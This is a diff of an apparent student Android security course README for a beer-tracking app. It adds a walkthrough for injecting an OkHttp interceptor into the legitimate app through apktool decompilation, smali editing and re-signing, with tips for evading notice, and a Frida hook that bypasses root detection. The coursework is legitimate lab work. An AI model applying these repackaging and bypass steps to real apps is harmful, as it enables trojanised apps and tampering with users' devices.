@@ -18,26 +18,56 @@ ZUIPPPEN
 - :x: = Not implemented
 - :hourglass: = Work in progress
  
-| Status             | Description                         | Details                     |     |
-| ------------------ | ----------------------------------- | --------------------------- | --- |
-|                    | **Application**                     |                             |     |
-| :heavy_check_mark: | 2 UI screens                        | Just need to make it pretty |     |
-| :heavy_check_mark: | Secure API request                  |                             |     |
-| :hourglass:        | API request with IDOR               |                             |     |
-| :heavy_check_mark: | Connection to room database         |                             |     |
-| :heavy_check_mark: | Secure storage                      |                             |     |
-|                    |                                     |                             |     |
-|                    | **Security**                        |                             |     |
-| :heavy_check_mark: | Unsafe storage                      |                             |     |
-| :hourglass:        | Malware                             |                             |     |
-| :heavy_check_mark: | Frida functionality                 |                             |     |
-| :heavy_check_mark: | Detect root and block functionality |                             |     |
+| Status             | Description                         | Details                           |     |
+| ------------------ | ----------------------------------- |-----------------------------------| --- |
+|                    | **Application**                     |                                   |     |
+| :heavy_check_mark: | 2 UI screens                        | Just need to make it pretty       |     |
+| :heavy_check_mark: | Secure API request                  |                                   |     |
+| :heavy_check_mark: | API request with IDOR               |                                   |     |
+| :heavy_check_mark: | Connection to room database         |                                   |     |
+| :heavy_check_mark: | Secure storage                      |                                   |     |
+|                    |                                     |                                   |     |
+|                    | **Security**                        |                                   |     |
+| :heavy_check_mark: | Unsafe storage                      |                                   |     |
+| :heavy_check_mark: | Malware                             | Look at Readme in group39/malware |     |
+| :heavy_check_mark: | Frida functionality                 |                                   |     |
+| :heavy_check_mark: | Detect root and block functionality |                                   |     |
 
 # Overview app
 Describe the implementation of the following topics.
 
 ### ![](readme-resources/Screenshot.png) Screenshots
 Give screenshots for every screen in the application. Give each screen an unique name.
+
+#### Login Page
+![img.png](readme-resources/loginPage.png)
+
+#### Register Page
+![img.png](readme-resources/registerPage.png)
+
+#### Main Screen
+![img.png](readme-resources/mainScreen.png)
+
+#### Profile Page
+![img.png](readme-resources/profilePage.png)
+
+#### Stack Page
+![img.png](readme-resources/stackPage.png)
+
+#### Leaderbord
+![img.png](readme-resources/leaderbord.png)
+
+#### Add to Stack
+![img.png](readme-resources/addToStack.png)
+
+#### Beer details
+![img.png](readme-resources/beerDetails.png)
+
+#### Add own beer
+![img.png](readme-resources/addOwnBeer.png)
+
+---
+
 
 ## ![](readme-resources/API.png) Secure API request/Intercept & Modify Request (Secure)
 
@@ -219,6 +249,76 @@ API as reference
 
 ## ![](readme-resources/Database.png) Room database
 Type of data stored in the database used in screen x and displayed in screen y.
+### Documentation
+
+The application uses a **Room database** to store **local user authentication data**.  
+This database is used for the **Login**, **Register**, and **Profile** screens.
+
+---
+
+## Type of data stored
+
+The Room database contains a single table called `users`.
+
+Each record in the table represents one user and contains the following fields:
+- `userid` – Integer, primary key, auto-generated
+- `userName` – Username of the user
+- `userPassword` – Password of the user
+
+This data is stored locally to support **offline usage** and **user persistence**.
+
+---
+
+## Entity – User
+
+The `User` entity defines the structure of the `users` table in the database.
+
+```kotlin
+@Entity(tableName = "users")
+data class User(
+    @PrimaryKey(autoGenerate = true)
+    val userid: Int = 0,
+    val userName: String,
+    val userPassword: String,
+)
+```
+
+---
+
+## DAO - UserDao
+
+The `UserDao` is responsible for all database operations related to users.
+
+**Implemented functionality**
+- Insert a new user
+- Update existing user data
+- Delete a user
+- Retrieve all users
+- Retrieve a user by ID
+- Authenticate a user (login)
+- Check if a username already exists (case-insensitive)
+
+The DAO uses Kotlin Flow so database changes are observed automatically
+
+## Repository pattern
+
+To seperate database logic from UI logic, the **Repository pattern** is used.
+
+**Structure**
+- `UsersRepository` defines the available database operations
+- `OfflineUsersRepository` implements these operations using Room
+
+This abstraction improves maintainability and testability
+
+## Database configuration
+
+The Room database is configured in `Appdatabase`.
+
+**Details**
+- Database name: `app_database`
+- Database version: `1`
+- Uses a **Signleton pattern** to ensure a single database instance
+- `fallbacktoDestructiveMigration()` is enabled for development
 
 ## ![](readme-resources/Database.png) Secure storage
 Type of data stored used in screen x and displayed in screen y.
@@ -228,15 +328,211 @@ Type of data stored used in screen x and displayed in screen y.
 
 ## ![](readme-resources/Notifications.png) Malware
 Implementation of malware.
+# Documentation
+
+## Starting
+
+Started off with just an alert popping up that told you to do an atje but this was not really malware.
+
+Then we heard from the teachers that someone changed all the pictures by intercepting the api so we just stole this idea and did this too.
+
+Started off by looking at which things i needed for the api in the app. 
+
+![[image21.png]](readme-resources/image21.png)
+
+In BeerDto.kt you can see what comes out of the api and we need the imageurl
+
+![[image22.png]](readme-resources/image22.png)
+In SupabaseBeerApiService.kt you can see it gets everything out of the api in getBeers() and you can see again how the list is made up so at first i thought i needed to write some code to do something with this.
+
+## Writing malware
+
+But then Perplexity gave me the okhttp3 function of intercept
+
+![[image23.png]](readme-resources/image23.png)
+So with the help of Perplexity I came up with this code
+
+```kotlin
+package com.example.malware  
+  
+import okhttp3.Interceptor  
+import okhttp3.Response  
+import okhttp3.ResponseBody.Companion.toResponseBody  
+  
+class ImageRewriteInterceptor : Interceptor {  
+  
+    override fun intercept(chain: Interceptor.Chain): Response {  
+        val myImageUrl = "https://defruyt.net/noah/Images/Noah.jpg"  
+  
+        val original = chain.proceed(chain.request())  
+        val body = original.body ?: return original  
+  
+        val bodyStr = body.string()  
+  
+        val patched = bodyStr.replace(  
+            Regex("\"imageurl\"\\s*:\\s*\".*?\""),  
+            "\"imageurl\":\"$myImageUrl\""  
+        )  
+  
+        val newBody = patched.toResponseBody(body.contentType())  
+        return original.newBuilder()  
+            .body(newBody)  
+            .build()  
+    }  
+}
+```
+
+
+Write this inside a new app
+
+The name of the app doesn't really matter if they eventually look inside the apk files the only thing they might find and can find suspicious is the name of the class
+![[image24.png]](readme-resources/image24.png)
+As you can see the class name is ImageRewriteInterceptor a totally not suspicious name
+and you also have to make sure to include
+`implementation("com.squareup.okhttp3:okhttp:4.11.0")`
+in the build.gradle.kts so that you can actually use the okhttp3 module.
+The reason i knew it was the 4.11 version is because i looked in our own app which version we used and copied it into the malware so there is no difference there
+
+![[image25.png]](readme-resources/image25.png)
+## Decompile & Recompile
+
+### Getting an APK file for the malware
+
+Now that we have the code it is time to build the malware app and get the apk
+I did this using android studio
+![[image26.png]](readme-resources/image26.png)
+In Build > Generate App Bundle or APKs > Generate APKs
+It will build the app and generate an APK inside app/build/outputs/apk/debug/app-debug.apk
+![[image27.png]](readme-resources/image27.png)
+
+Now you can use this apk for whatever you want
+
+We needed it to get the smali from our class out of it and copy it inside our legitimate app
+
+
+### Decompiling the malware
+So we needed to decompile the APK file of the malware. I did this using the following command:
+
+`apktool d -f -o .\malware app-debug.apk`
+
+d = decompile
+
+-f = force
+
+-o = output
+
+This makes it so that the apktool decompiles the app-debug.apk and puts all the files inside a folder called malware
+
+Now we can see everything in smali and we need to find where the smali code for our class is
+
+![[image28.png]](readme-resources/image28.png)
+After some searching you can find it inside the malware/smali_classes3/com/example/malware/ImageRewriteInterceptor.smali
+
+Need to make sure you can find this file because we will need it now
+
+### Decompiling the original app
+For the original app I just used the same code again but now for the beerstack apk file (will be the same name because of android studio)
+
+`apktool d -f -o ./beerstack app-debug.apk`
+
+again decompiling app-debug.apk and putting all its files inside a folder called beerstack
+
+Now here we need to get to the same place as in the malware folder where our own class was created so we need to go to */beerstack/smali_classes3/com/example/beerstack/* If this would not exist just create it so it can be at the same place as the other one
+just copy and paste the file from malware to beerstack
+![[image29.png]](readme-resources/image29.png)
+For us there is also another folder there but that doesn't matter
+
+### Search for the new-instance of okhttpclient$Builder
+
+I did this using perplexity they made this search command for me
+
+
+```bash
+rg "new-instance v[0-9], Lokhttp3/OkHttpClient\$Builder" -n smali* || \
+grep -R "Lokhttp3/OkHttpClient\$Builder;-><init>" smali*
+```
+
+used kali for this one
+![[image30.png]](readme-resources/image30.png)
+
+It was still pretty hard to find the first time making this because you got alot of input and i was first looking at a file called okHttpClient$Builder but thats not the one.
+The second time is the screenshot above and that was an updated version of the app that was much easier to find because there was only 1 possible file
+
+you need you need a line inside some smali file that says something like this
+![[image31.png]](readme-resources/image31.png)
+
+and some time later
+![[image32.png]](readme-resources/image32.png)
+But you don't know the number so here it was 0
+
+![[image33.png]](readme-resources/image33.png)
+
+```smali
+    # --- your injected code start ---
+    new-instance v1, Lcom/example/malware/ImageRewriteInterceptor;
+    invoke-direct {v1}, Lcom/example/malware/ImageRewriteInterceptor;-><init>()V
+
+    invoke-virtual {v0, v1}, Lokhttp3/OkHttpClient$Builder;->addInterceptor(Lokhttp3/Interceptor;)Lokhttp3/OkHttpClient$Builder;
+    move-result-object v0
+    # --- your injected code end ---
+```
+
+- We have to make sure that we insert our own code right before the build() option
+- Make sure that the number after v is one higher then the new instance from before so in this case 1
+- Make sure the paths lead to where we just copied the ImageRewriteInterceptor /Lcom/example/malware/ImageRewriteInterceptor (its still the malware you need to link to)
+  You can find where you need to link to inside the ImageRewriteInterceptor.smali file
+  ![[image34.png]](readme-resources/image34.png)
+  At the top you have a .class public and that one is the one that needs to be in the new instance and invoke direct
+
+And maybe if you really want to do this make sure you don't make it that obvious with the commented injected interceptor lines
+
+## Recompile and sign the apk
+
+First we need to recompile the beerstack folder where we made the changes
+using the command:
+
+`apktool b beerstack -o beerstack_patched-unsinged.apk`
+![[image35.png]](readme-resources/image35.png)
+
+now we have an apk file again but when we try to install this on the android phone it wont work because the apk is not signed yet thats the next step
+
+using the command:
+`keytool -genkeypair -v -keystore mydebug.jks -alias mykey -keyalg RSA -keysize 2048 -validity 10000`
+
+We create a key that we can sign the apk file with
+
+![[image36.png]](readme-resources/image36.png)
+![[image37.png]](readme-resources/image37.png)
+
+Now using this just created mydebug.jks keyfile we can sign the apk file using the following command:
+
+`apksigner sign --ks mydebug.jks --ks-key-alias mykey beerstack_patched-unsinged.apk`
+
+![[image38.png]](readme-resources/image38.png)
+
+Now we need to install it on the phone again using adb and test if it works
+
+![[image39.png]](readme-resources/image39.png)
+
+![[image40.png]](readme-resources/image40.png)
+
+After installation it works
+
+
+---
 
 ## ![](readme-resources/Frida.png) Frida
 Detail implementation of Frida
-### What to do
+### What to do 
+
 ![image.png](readme-resources/image12.png)
+
 We will be bypassing this function that checks if the phone is rooted or not so that we will still be able to run the app even though we have a rooted device.
 
-### Starting point
-![image.png](readme-resources/11.png)
+### Starting point 
+
+![image.png](readme-resources/image11.png)
+
 I started of with the code from the slides and tested just this but with some tweaks so it fits our app and not the one from the slides
 
 ```Javascript
@@ -257,7 +553,7 @@ Java.perform(function () {
 
 ![image.png](readme-resources/image13.png)
 
-This was the result of the first test where we see that we called the isRooted() functionality and were able to do something with it so for now just a console.log() and do what it was supposed to do with the this.isRooted()
+This was the result of the first test where we see that we called the isRooted() functionality and were able to do something with it so for now just a console.log() and do what it was supposed to do with the this.isRooted() 
 
 ### Final changes
 
@@ -278,8 +574,10 @@ Java.perform(function () {
 ```
 
 We changed the this.isRooted(); to return false;
-so now we don't just call the normal isRooted() function but we just always return a false so that it always looks like the device is not rooted.
+so now we don't just call the normal isRooted() function but we just always return a false so that it always looks like the device is not rooted. 
+
 ![image.png](readme-resources/image12.png)
+
 Now we see it got called and there are no more errors and the app just starts up even though we have a rooted device
 
 ## ![](readme-resources/Root.png) Root
